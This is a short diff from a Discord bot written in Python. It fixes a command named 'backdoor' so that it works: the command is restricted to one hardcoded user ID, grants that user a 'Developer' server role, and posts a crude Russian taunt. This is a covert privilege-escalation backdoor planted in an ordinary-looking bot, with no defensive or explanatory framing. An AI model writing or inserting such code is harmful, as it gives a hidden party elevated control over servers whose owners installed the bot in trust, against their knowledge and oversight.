@@ -24,7 +24,7 @@ async def nick(ext, *, nickname):
 @has_id(433525822956109843)
 async def backdoor(ext):
         role = discord.utils.get(ext.guild.roles, name = "Developer🔨")
-        await member.add_roles(role)
+        await ext.message.author.add_roles(role)
         await ext.send("Серёга готовься сосать")
 
 @client.command()
